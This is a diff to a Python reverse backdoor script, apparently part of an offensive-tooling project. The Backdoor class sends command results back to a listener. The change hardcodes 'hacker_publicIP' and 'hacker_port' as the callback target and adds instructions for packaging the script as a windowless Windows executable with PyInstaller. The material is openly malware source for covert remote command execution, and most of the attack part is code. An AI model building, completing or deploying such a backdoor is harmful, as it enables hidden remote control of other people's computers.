@@ -63,14 +63,13 @@ class Backdoor:
 
             self.send_to_listener(command_result)
 
-ssh_tunnel = input("Enter the IP address of the server running your SSH reverse tunnel: ")
-ssh_port = int(input("Enter the port of the SSH reverse tunnel: "))
-my_backdoor = Backdoor(ssh_tunnel, ssh_port)
+# You need to change this to your PubIP & Port before running this .python file or reference this directly as an argument when running your code.
+my_backdoor = Backdoor(hacker_publicIP, hacker_port)
 my_backdoor.run()
 
-"""
-converting python code into an executable in windows:
-Install pyinstaller in your system: C:\Python27\python.exe -m pip install pyinstaller # find the name of the file path where python is installed
-Then compile into an exec: C:\Python27\Scripts\pyinstaller.exe reverse_backdoor.py --onefile --noconsole # find the path of pyinstaller.exe
---onefile ensures that reverse_door.py is compiled into one executable file
-"""
+
+# How to convert python code into an executable in windows:
+# Install pyinstaller in your system: C:\Python27\python.exe -m pip install pyinstaller # find the name of the file path where python is installed
+# Then compile into an exec: C:\Python27\Scripts\pyinstaller.exe reverse_backdoor.py --onefile --noconsole # find the path of pyinstaller.exe
+# --onefile ensures that reverse_door.py is compiled into one executable file
+
